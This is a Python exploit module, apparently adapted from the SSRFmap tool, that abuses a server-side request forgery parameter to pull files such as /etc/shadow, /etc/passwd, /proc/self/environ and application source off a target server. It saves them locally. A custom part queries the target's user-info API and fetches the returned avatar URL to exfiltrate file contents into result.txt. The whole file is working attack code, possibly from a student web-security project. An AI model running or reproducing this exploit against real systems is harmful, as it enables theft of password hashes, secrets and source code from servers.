from core.utils import *
import logging
import os
import requests
import json
import project
name          = "readfiles"
description   = "Read files from the target"
author        = "Swissky"
documentation = []

class exploit():
    
    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched !")
        if args.targetfiles and isinstance(args.targetfiles, str):
            self.files = args.targetfiles.split(',')
        else: 
            self.files = [
            "/etc/passwd", 
            "/etc/lsb-release", 
            "/etc/shadow", 
            "/etc/hosts", 
            "\\/\\/etc/passwd", 
            "/proc/self/environ", 
            "/proc/self/cmdline", 
            "/proc/self/cwd/index.php", 
            "/proc/self/cwd/application.py", 
            "/proc/self/cwd/main.py", 
            "/proc/self/exe"
        ]   
        self.file_magic = {'elf' : bytes([0x7f, 0x45, 0x4c, 0x46])}
        
        r = requester.do_request(args.param, "")
        
        if r is not None:
            default = r.text
            logging.info(r.text)
            # Create directory to store files
            directory = requester.host
            # Replace : with _ for window folder name safe
            # https://www.ibm.com/docs/en/spectrum-archive-sde/2.4.1.0?topic=tips-file-name-characters
            directory =  directory.replace(':','_')
            if not os.path.exists(directory):
                os.makedirs(directory)

            for f in self.files:
                r  = requester.do_request(args.param, wrapper_file(f))
                diff = diff_text(r.text, default)
                if diff != "":

                    # Display diff between default and ssrf request
                    logging.info(f"\033[32mReading file\033[0m : {f}")
                    if bytes(diff, encoding='utf-8').startswith(self.file_magic["elf"]):
                        logging.info("ELF binary found - not printing to stdout")
                    else:
                        logging.info(diff)
                        if json.loads(diff)['msg'] == '操作成功':
                            baseurl = 'http://' + directory.replace('_',':')
                            avatar_url = userInfo(baseurl, args.token)
                            if avatar_url:
                                logging.info('ghi vao file ~/bao_mat_web/doan/result.txt')
                                with open('../result.txt', 'a') as file:
                                    file.write(f"{f}\n")
                                    file.write('=========================================\n')
                                    file.write(checkFile(avatar_url))
                                    file.writelines('=========================================\n')
                            else:
                                print('none')

                    # Write diff to a file
                    filename = f.replace('\\','_').replace('/','_')
                    logging.info(f"\033[32mWriting file\033[0m : {f} to {directory + '/' + filename}")
                    with open(directory + "/" + filename, 'w') as f:
                        f.write(diff)

        else:
            logging.info("Empty response")

def userInfo(baseurl, token):
    url = baseurl + '/api/user/info'

    r = requests.get(url, headers={"token": token}, verify=False)
    response = json.loads(r.text)
    if response["code"] == 1:
        avatar_url = response['data']['avatar']
        return avatar_url
    return None

def checkFile(avatar_url):
    if avatar_url != "": 
        r = requests.get(avatar_url, verify=False)
        response = r.text
        if r.status_code == 200:
            return response
        return None